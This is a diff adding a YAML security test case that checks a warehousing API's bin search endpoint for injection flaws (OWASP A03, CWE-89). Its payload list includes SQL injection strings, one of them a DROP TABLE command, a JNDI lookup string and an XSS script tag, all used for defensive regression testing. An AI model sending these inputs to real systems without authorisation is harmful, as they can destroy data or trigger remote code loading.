@@ -1,0 +1,19 @@
+# sec-036-bin-a03-injection: Bin: A03 Injection in search
+id: sec-036-bin-a03-injection
+title: "Bin: A03 Injection in search"
+module: warehousing
+table: Bin
+owasp: "A03:2021 Injection"
+cwe: CWE-89
+severity: high
+target:
+  method: GET
+  path: "/api/warehousing/bins?q="
+payloads:
+  - "' OR '1'='1"
+  - "\"; DROP TABLE Bin; --"
+  - "${jndi:ldap://x}"
+  - "<script>alert(1)</script>"
+expected: "200 with an empty or filtered page; BinName search is parameterised; no stack trace"
+legacy_reference: legacy/warehousing/si_bin.p
+automated_by: zap-baseline + custom request runner
